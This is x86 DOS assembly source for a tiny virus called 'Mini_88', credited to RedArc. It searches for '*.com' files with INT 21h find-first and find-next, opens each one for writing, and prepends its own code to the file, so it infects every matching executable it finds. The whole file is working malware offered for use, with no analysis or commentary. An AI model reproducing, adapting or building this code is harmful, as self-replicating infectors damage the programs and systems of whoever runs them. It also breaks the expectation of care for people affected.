; Mini_88 (c) by RedArc
Model Tiny
.code
org 100h
vvv equ 0eeeeh
start:
       mov ax,cs
       inc ah
       mov es,ax
       mov cx,si
       mov si,bx
       mov di,bx
       rep movsb
       push es
       push di
       mov cl,virlength
       inc ch
       xchg si,cx
       mov cx,vvv
       rep movsb
       mov ah,4eh
       mov cl,virlength-6
       xchg dx,cx
       inc dh
@0:
       int 21h
       jnb @1
       retf
@1:
       mov ax,3d02h
       cwd
       mov dl,9eh
       int 21h
       xchg bx,ax
       mov ah,3fh
       mov dl,virlength
       inc dh
       push sp
       pop cx
       int 21h
       add ax,virlength
       push ax
       mov ax,4200h
       cwd
       xor cx,cx
       int 21h
       pop cx
       mov ah,40h
       inc dh
       int 21h
       mov ah,4fh
       jmp short @0
filename db '*.com', 0h
virlength equ $-start
buff label byte
       ret
end start
